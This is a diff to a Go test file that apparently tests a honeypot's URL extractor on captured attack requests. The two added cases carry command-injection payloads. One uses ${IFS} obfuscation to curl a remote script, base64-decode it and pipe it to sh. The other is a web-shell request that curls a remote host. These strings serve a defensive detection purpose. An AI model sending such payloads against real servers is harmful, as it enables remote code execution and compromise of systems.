@@ -191,6 +191,29 @@ func TestURLExtractor(t *testing.T) {
 			},
 		},
 		{
+			description: "Find URL in body with ${IFS} string",
+			urlsToFind:  []string{"http://193.32.162.x/jobs/tp"},
+			request: models.Request{
+
+				Uri:        "/?act=op&ofid=1&uid=1&vid=1&lid=1&cid=1&pid=1_\"';curl${IFS}-s${IFS}'http://193.32.162.x/jobs/tp'${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}sh;",
+				Raw:        "not important",
+				Body:       []byte(""),
+				HoneypotIP: "1.1.1.1",
+			},
+		},
+		{
+			description: "Find URL in body with $IFS string",
+			urlsToFind:  []string{"http://45.61.139.121/di"},
+			request: models.Request{
+
+				Uri:        "/shell.php?cmd=curl$IFShttp://45.61.139.121/di",
+				Raw:        "not important",
+				Body:       []byte(""),
+				HoneypotIP: "1.1.1.1",
+			},
+		},
+
+		{
 			description: "Find URL in encoded body without urlencoded header",
 			urlsToFind:  []string{"http://104.168.5.4/forti.sh"},
 			request: models.Request{
